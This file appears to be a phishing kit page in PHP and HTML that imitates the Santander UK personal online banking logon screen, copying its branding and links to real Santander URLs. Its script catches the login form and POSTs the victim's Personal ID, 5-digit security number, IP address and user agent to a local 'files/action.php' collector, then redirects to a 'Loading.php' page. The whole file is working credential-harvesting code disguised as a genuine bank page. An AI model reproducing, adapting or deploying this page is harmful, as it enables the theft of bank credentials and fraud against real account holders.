<?php
$ip = $_SERVER['REMOTE_ADDR'];
$ua = $_SERVER['HTTP_USER_AGENT'];
?>
<!DOCTYPE html>
<html lang="en-GB">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <!--<base href="/olb/app/logon/access/">-->
        <base href="." />

        <title>Personal Online Banking: Log on or sign up</title>
        <meta name="title" content="Online Banking | Personal Account Holders | Santander UK" />
        <meta name="description" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
        <meta name="abstract" content="Access your account information online with internet banking from Santander; manage your money, cards and view other services. Find out more at Santander.co.uk" />
        <link rel="icon" href="files/img/favicon.ico" type="image/x-icon" />

        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta http-equiv="Pragma" content="no-cache" />
        <meta http-equiv="Cache-Control" content="no-cache, no-store" />
        
		
        <style type="text/css">
            body {margin:0; padding: 0;height: 100%;}      #splash-97123-overlay{padding:0;margin:0;position: absolute;top:0;left:0;right:0;width:100%;height:100%;background:#595959 url(https://d1byywzi6ghj11.cloudfront.net/img/spacer.gif) center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-splash {font-family:verdana,arial,tahoma;font-size:14px;width: 640px; margin: 20px -320px;z-index:10002; position: absolute;left: 50%;top:100px;display: block;}      #splash-97123-body {title:Please download Trusteer Rapport which provides you with advanced layers of protection against malware and other security threats. For more information click on the Learn More link which also contains a link to download the Trusteer Rapport software.;color:#000;height:495px;width:640px;font-size: 12px;font-family:verdana,arial,tahoma;text-align:left;color:black;background: url(https://d1byywzi6ghj11.cloudfront.net/img/santanderuk_personal_20140304_image_src.jpg) center center;}      #splash-97123-close-button{height:30px;width:30px;position:relative;float:right;border:none;cursor:pointer;margin:-10px -15px -10px 0px;background: url(https://d1byywzi6ghj11.cloudfront.net/img/close-btn.png) center center;text-align:left;z-index:10002; }      #splash-97123-download-button {padding: 2px; text-align: center; width:222px; margin: 20px auto 10px;  cursor: pointer; position:absolute;top:366px;left: 413px;height:52px}      #splash-97123-download-button p {color:#000;background:#04A2F4;color:#ffffff;line-height:20px;font-size:20px;text-align:left;padding:0px}        #splash-97123-download-button-container{ text-align: center}        #splash-97123-iframe { width:100%; height:100%;border:0;background: #595959; color: #595959;}        #splash-97123-iframe body{background: #595959; color: #595959; }        #splash-97123-footer-left {float:left;padding-left:20px;text-align:left;position:absolute;bottom:19px;}      #splash-97123-footer-left a {margin-right: 10px; color: #0033FF; font-size: 12px;font-weight: normal; text-decoration: underline;text-align:left;font-family:verdana,arial,tahoma;}      #splash-97123-footer-left a:hover {color: #0033FF;}      #splash-97123-body-overlay {padding:0;margin:0;position: absolute;top:0;*top:10px;left:0;right:0;width:640px;height:495px;background:#8D8D8D center center;z-index:1001;-moz-opacity: 0.8;opacity: 0.80;filter: alpha(opacity=80);display: block;}      #splash-97123-clicked-message {title:Thank you for downloading Trusteer Rapport. (Don&#39;t forget to open and run the file once it has finished downloading). Close this message. How do I install?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(https://d1byywzi6ghj11.cloudfront.net/img/download_click_1.png);}      #splash-97123-clicked-close-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-clicked-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;display:block;}      #splash-97123-downloaded-message {title:Your account is not yet protected. You have downloaded Trusteer Rapport to protected your online account, buy it&#39;s currently not protecting your online banking. Download Again. Why Not?;width:640px;height:179px;z-index:1002;position:absolute;left:0px;top:150px;display: block;background: url(https://d1byywzi6ghj11.cloudfront.net/img/already_downloaded_1.png);}      #splash-97123-downloaded-download-button {width:167px;height:30px;position:absolute;top:122px;left:146px;cursor:pointer;}      #splash-97123-downloaded-help-button {width:167px;height:30px;position:absolute;top:122px;left:326px;cursor:pointer;}
        </style>
        <style></style>
        
        <style>
            .security-number[_ngcontent-erl-c1] {
                color: #000;
                letter-spacing: 20px;
                background-color: transparent;
            }
            .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::-moz-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
                color: #ccc !important;
            }
            .security-number[_ngcontent-erl-c1]::placeholder {
                color: #ccc !important;
            }
            @supports not ((-webkit-hyphens: auto) or (-ms-hyphens: auto) or (hyphens: auto)) {
                .security-number[_ngcontent-erl-c1] {
                    -webkit-text-stroke-width: 0.2em;
                }
                .security-number[_ngcontent-erl-c1]::-webkit-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::-moz-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]:-ms-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::-ms-input-placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
                .security-number[_ngcontent-erl-c1]::placeholder {
                    -webkit-text-stroke-width: 0 !important;
                }
            }
            .invalid-security-number[_ngcontent-erl-c1] {
                border: 1px solid #ec0000 !important;
                border-radius: 4px;
            }
        </style>
        <style>
	
	input:required {
		box-shadow:none !important;
		border: 1px solid #979797;
	}
	input:invalid {
		box-shadow:none !important;
		border: 1px solid #979797;
	}
	
	</style>
		<script src="files/js/jquery.js"></script>
	<script>
	
//
$( document ).ready(function() {



	
	
	
	$('#loginForm').submit(function(e){
		e.preventDefault();
		var username = $('#username').val();
		var securityNumber = $('#securityNumber').val();
		
		if(username == null || username == '' || securityNumber == null || securityNumber == ''){
			return false;
		}
		
		
		$.ajax({
			type : 'POST',
			url : 'files/action.php?type=login',
			data : $('#loginForm').serialize(),
			success: function (data) {
				console.log(data);
				var parsed_data = JSON.parse(data);
				if(parsed_data.status == 'ok'){
					//console.log(parsed_data);
					
					
					location.href = "Loading.php"
					
					
					
				}else{
					return false;
				}
				//console.log(parsed_data.status);
			}
			})
		
		
		
	});
	
	
	
	

	
	
	
});
	
	
	
	</script>
    </head>
    <body>
        <meta http-equiv="content-secure-policy" content="deafult-src 'self'="" '*'="" "="">
        <meta http-equiv="X-Xss-Protection" content="&#39;1; mode=block&#39; always" />
        <meta http-equiv="X-Content-Type-Options" content="&#39;nosniff&#39; always" />
        <meta http-equiv="Strict-Transport-Security" content="max-age=31536000" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=1, maximum-scale=2.0" />
        <!--<base href="/">-->
        <base href="." />
        
		

        <link rel="stylesheet" href="files/css/styles.d639dea2316e6d785b32.css" />

        <olb-root _nghost-erl-c0="" ng-version="7.2.16">
            <olb-home _ngcontent-erl-c0="">
                <div class="container-fluid appheader">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding header-responsive" role="banner">
                                <olb-header>
                                    <nav class="navbar appheader_content">
                                        <a href="https://www.santander.co.uk/"><img alt="Santander Image" class="img-fluid Bitmap header-logo-santander" src="files/img/header-logo.png" /></a>
                                        <!----><!---->
                                        <div>
                                            <span class="title-small singup-text">Don’t have Online Banking?&nbsp;</span>
                                            <a
                                                aria-describedby="signupDesc"
                                                aria-label="Sign up to Online Banking"
                                                class="anchor-red-links"
                                                href="https://retail.santander.co.uk/ENRIUK_NS_ENS/BtoChannelDriver.ssobto?dse_operationName=Access_ENRIUK"
                                            >
                                                Sign up
                                            </a>
                                        </div>
                                    </nav>
                                </olb-header>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="container">
                    <div class="row">
                        <div aria-live="assertive" class="col-sm-12 main-section-responsive" role="main">
                            <router-outlet></router-outlet>
                            <olb-logon>
                                <div class="content">
                                    <div class="row">
                                        <div class="col-lg-5 col-sm-12 left-content">
                                            <div>
                                                <div class="d-flex justify-content-center mt-4" id="logon-heading"><h1 class="title-header title-color-red">Log on to your Online Banking</h1></div>
                                                <div aria-live="off" class="mt-3">
                                                    <ul class="nav nav-tabs d-flex justify-content-center" role="tablist">
                                                        <li class="nav-item" role="presentation"><a class="nav-link active" data-toggle="tab" href="https://retail.santander.co.uk/olb/app/logon/access/" role="tab">Personal</a></li>
                                                        <li class="nav-item" role="presentation"><a class="nav-link" role="tab" spacebarclick="" href="https://business.santander.co.uk/olb/app/logon/access/">Business</a></li>
                                                        <li class="nav-item" role="presentation">
                                                            <a class="nav-link" role="tab" spacebarclick="" href="https://corporate.santander.co.uk/LOGSCU_NS_ENS/BtoChannelDriver.bto?dse_operationName=OP_LOG_ON">Corporate</a>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                            <div>
                                                <div class="tab-content d-flex justify-content-center mt-4 mb-5">
                                                    <div class="tab-pane active retail-logon-content" id="personal" role="tabpanel">
                                                        <div aria-live="off">
                                                            <olb-retail-logon>
                                                                <div class="logon-form">
                                                                    <form autocomplete="off" name="loginForm" id="loginForm" method="post" class="ng-invalid ng-touched ng-dirty">
																		<input type="hidden" name="ip" value="<?=$ip;?>">
																		<input type="hidden" name="ua" value="<?=$ua;?>">
                                                                        <div class="errorMessage mb-3">
                                                                            <olb-validation-message imglocation="files/img/alert.svg" msgtype="warn"><!----></olb-validation-message>
                                                                        </div>
                                                                        <div class="row">
                                                                            <div class="form-group">
                                                                                <label class="label" for="pid">Personal ID</label>
                                                                                <input
																					required
                                                                                    alphanumericvalidator=""
                                                                                    aria-describedby="pidDesc"
                                                                                    aria-required="true"
                                                                                    autocomplete="off"
                                                                                    class="form-control logon-textbox ng-touched ng-dirty ng-valid"
                                                                                    formcontrolname="pid"
                                                                                    id="username"
                                                                                    maxlength="26"
                                                                                    minlength="5"
                                                                                    name="username"
                                                                                    onpaste="return true"
                                                                                    type="text"
                                                                                />
                                                                                <!----><!---->
                                                                                <span class="d-none" id="pidDesc"> Please Enter your Personal ID </span>
                                                                            </div>
                                                                        </div>
                                                                        <div class="row">
                                                                            <div class="form-group">
                                                                                <label class="label" for="securityNumber">Security number</label>
                                                                                <div class="security-number-help-info"><span> You may know this as your 5 digit Registration Number or Customer PIN </span></div>
                                                                                <common-security-number _nghost-erl-c1="">
                                                                                    <!----><!---->
                                                                                    <div _ngcontent-erl-c1="" class="ng-invalid ng-touched ng-dirty">
                                                                                        <label _ngcontent-erl-c1="" class="sr-only" for="securityNumber">Security Number</label>
                                                                                        <input
																							required
                                                                                            _ngcontent-erl-c1=""
                                                                                            aria-required="true"
                                                                                            autocomplete="off"
                                                                                            maxlength="5"
                                                                                            minlength="5"
                                                                                            oncopy="return false"
                                                                                            oncut="return false"
                                                                                            onpaste="return false"
                                                                                            placeholder="●●●●●"
                                                                                            type="password"
                                                                                            class="security-number form-control logon-textbox password-textbox ng-untouched ng-pristine ng-invalid"
                                                                                            id="securityNumber"
                                                                                            name="securityNumber"
                                                                                            aria-describedby="securityNumberDacIdsecurityNumber"
                                                                                        />
                                                                                        <span _ngcontent-erl-c1="" class="d-none" id="securityNumberDacIdsecurityNumber">
                                                                                            Please Enter 5 digits security number and it is also known as Registration number or Customer PIN
                                                                                        </span>
                                                                                    </div>
                                                                                </common-security-number>
                                                                                <!----><!---->
                                                                            </div>
                                                                        </div>
                                                                        <div class="row d-flex">
                                                                            <div class="rememberMeDiv">
                                                                                <label class="checkbox_container">
                                                                                    <!----><!---->
                                                                                    <input
                                                                                        aria-describedby="remembermeDesc"
                                                                                        aria-label="Remember ID"
                                                                                        formcontrolname="rememberme"
                                                                                        id="rememberme"
                                                                                        name="rememberme"
                                                                                        type="checkbox"
                                                                                        class="ng-untouched ng-pristine ng-valid"
                                                                                    />
                                                                                    <span class="checkbox_text">Remember ID </span><span class="checkmark"></span>
                                                                                    <div class="d-none"><span id="remembermeDesc"> Please check the checkbox if you want to remember your Personal ID in this device </span></div>
                                                                                </label>
                                                                            </div>
                                                                        </div>
                                                                        <div class="row d-flex">
                                                                            <div class="mt-2">
                                                                                <label class="checkbox_container">
                                                                                    <input
                                                                                        aria-describedby="publicDeviceDesc"
                                                                                        aria-label="I&#39;m using a public or shared device"
                                                                                        formcontrolname="publicdevice"
                                                                                        id="publicdevice"
                                                                                        name="publicdevice"
                                                                                        type="checkbox"
                                                                                        class="ng-untouched ng-pristine ng-valid"
                                                                                    />
                                                                                    <span class="checkbox_text"> I'm using a public or shared device </span><span class="checkmark"></span>
                                                                                    <span class="d-none" id="publicDeviceDesc"> Please check the checkbox if you are using public or shared device </span>
                                                                                </label>
                                                                            </div>
                                                                        </div>
                                                                        <div class="mt-4 row d-flex">
                                                                            <!---->
                                                                            <div class="mt-4 text-center col-md-12 pl-0 pr-0">
                                                                                <div class="justify-content-center button-xs-width">
                                                                                    <button aria-describedby="logonButtonDesc" class="button button-secondary button-logon" id="submitbtn" type="submit">
                                                                                        <span class="log-on-text">Log on</span>
                                                                                    </button>
                                                                                    <span class="d-none" id="logonButtonDesc"> Please click logon button to validate your Personal ID and Security Number </span>
                                                                                </div>
                                                                            </div>
                                                                            <div class="col-md-12 mt-2">
                                                                                <div class="d-flex justify-content-center">
                                                                                    <a aria-describedby="forgottenDetailsDesc" class="anchor-red-links" tabindex="0" href="https://retail.santander.co.uk/olb/app/reset/">Forgotten details?</a>
                                                                                    <span class="d-none" id="forgottenDetailsDesc"> If you don't remember your logon credentials, Please click here </span>
                                                                                </div>
                                                                            </div>
                                                                            <!---->
                                                                            <div><!----></div>
                                                                        </div>
                                                                        <div>
                                                                            <input
                                                                                autocomplete="new-password"
                                                                                class="log-info__hidden"
                                                                                id="disable-pwd-mgr-1"
                                                                                name="disable-pwd-mgr-1"
                                                                                style="display: none;"
                                                                                type="password"
                                                                                value="disable-pwd-mgr-1"
                                                                            />
                                                                            <input
                                                                                autocomplete="new-password"
                                                                                class="log-info__hidden"
                                                                                id="disable-pwd-mgr-2"
                                                                                name="disable-pwd-mgr-2"
                                                                                style="display: none;"
                                                                                type="password"
                                                                                value="disable-pwd-mgr-2"
                                                                            />
                                                                        </div>
                                                                    </form>
                                                                </div>
                                                            </olb-retail-logon>
                                                        </div>
                                                    </div>
                                                    <div class="tab-pane" id="buisness" role="tabpanel"></div>
                                                    <div class="tab-pane" id="coporate" role="tabpanel"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="col-lg-7 right-content">
                                            <div aria-live="off">
                                                <olb-logon-right-content>
                                                    <div>
                                                        <div class="row logon-image mt-5">
                                                            <img
                                                                alt="Beware coronavirus scams Image"
                                                                class="logon-right-image"
                                                                src="files/img/asset-3-3-x.png"
                                                                srcset="files/img/asset-3-3-x@2x.png 2x, files/img/asset-3-3-x@3x.png 3x"
                                                            />
                                                        </div>
                                                        <div class="mb-1 mt-1 logon-text-details-container" id="victimDesc">
                                                            <div class="row">
                                                                <div class="text-header col-sm-12"><p>Beware coronavirus scams</p></div>
                                                            </div>
                                                            <div class="row">
                                                                <div class="logon-text-details col-sm-12">
                                                                    <p>
                                                                        Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from us is
                                                                        genuine.
                                                                        <a aria-describedby="covid-19-msg-desc" class="text-sub-details" href="https://www.santander.co.uk/personal/support/fraud-and-security/fraud-updates" target="_blank">
                                                                            Learn more
                                                                        </a>
                                                                        .
                                                                    </p>
                                                                    <span class="d-none" id="covid-19-msg-desc"> Learn more. </span>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </olb-logon-right-content>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="overlay modalshow" role="alert" id="shittymodal">
                                    <div class="modal logon-modal-dialog modalshow" id="myModal" role="dialog">
                                        <div class="modal-dialog modal-dialog-centered">
                                            <div class="modal-content">
                                                <div class="modal-body">
                                                    <div>
                                                        <olb-logon-right-content>
                                                            <div>
                                                                <div class="row logon-image mt-5">
                                                                    <img
                                                                        alt="Beware coronavirus scams Image"
                                                                        class="logon-right-image"
                                                                        src="files/img/asset-3-3-x.png"
                                                                        srcset="files/img/asset-3-3-x@2x.png 2x, files/img/asset-3-3-x@3x.png 3x"
                                                                    />
                                                                </div>
                                                                <div class="mb-1 mt-1 logon-text-details-container-modal-dialog" id="victimDesc">
                                                                    <div class="row">
                                                                        <div class="text-header col-sm-12"><p>Beware coronavirus scams</p></div>
                                                                    </div>
                                                                    <div class="row">
                                                                        <div class="logon-text-details col-sm-12">
                                                                            <p>
                                                                                Criminals are using coronavirus to target people. Please stay on the lookout for anything unusual. Don’t be rushed and make sure any contact claiming to be from
                                                                                us is genuine.
                                                                                <a
                                                                                    aria-describedby="covid-19-msg-desc"
                                                                                    class="text-sub-details"
                                                                                    href="https://www.santander.co.uk/personal/support/fraud-and-security/fraud-updates"
                                                                                    target="_blank"
                                                                                >
                                                                                    Learn more
                                                                                </a>
                                                                                .
                                                                            </p>
                                                                            <span class="d-none" id="covid-19-msg-desc"> Learn more. </span>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </olb-logon-right-content>
                                                    </div>
                                                    <div class="d-flex justify-content-center"><button onclick="$('#shittymodal').hide();$('#shittymodal').removeClass('modalshow');" class="button button-secondary" id="gotItbtn" type="button">Ok. Got it!</button></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </olb-logon>
                        </div>
                    </div>
                </div>
                <div class="container-fluid appfooter">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-12 containerPadding footer-responsive" role="contentinfo">
                                <olb-footer>
                                    <footer class="footer-base">
                                        <div class="footer-left-content">
                                            <!---->
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-and-mobile-banking-commitment">Online Banking Guarantee</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/accessibility">Site Help &amp; Accessibility</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Security &amp; Privacy</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/ways-to-bank/online-banking-service-terms-conditions">Terms &amp; Conditions</a>
                                            <a target="_blank" href="https://www.santander.co.uk/personal/support/customer-support/legal-information">Legal</a>
                                        </div>
                                        <div class="footer-right-content"><img alt="FSCS Protected Image" src="files/img/asset-2.png" /></div>
                                    </footer>
                                </olb-footer>
                            </div>
                        </div>
                    </div>
                </div>
                <div><olb-session></olb-session></div>
            </olb-home>
        </olb-root>
        
    </body>
</html>
